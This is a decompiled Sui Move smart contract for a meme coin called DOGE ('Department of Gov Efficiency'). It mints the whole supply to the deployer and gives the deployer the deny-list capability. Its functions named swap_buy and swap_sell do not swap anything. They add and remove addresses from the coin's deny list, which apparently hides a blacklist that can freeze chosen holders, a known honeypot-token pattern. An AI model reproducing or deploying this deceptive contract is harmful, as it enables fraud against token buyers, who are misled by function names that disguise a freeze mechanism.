module 0x9409b0eacb85320d2ba60e356e295ebc3f9ca357f9e5851f1e9b11795d1ff5c0::doge {
    struct DOGE has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: DOGE, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<DOGE>(arg0, 9, b"DOGE", b"Department of Gov Efficiency", b"The Department of Government Efficiency, proposed by Donald Trump, would be led by Elon Musk to audit federal spending, reduce waste, and propose reforms to enhance government performance, reflecting their recent political alliance.", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://ipfs.io/ipfs/QmR5h6S8ryrPCNuM5DbsDS6FHqxieHWdyBWN3EkEw9VJWs"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<DOGE>(&mut v3, 1000000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<DOGE>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<DOGE>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<DOGE>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<DOGE>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<DOGE>(arg0, arg1, arg2, arg3);
    }

    public fun swap_sell(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<DOGE>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<DOGE>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

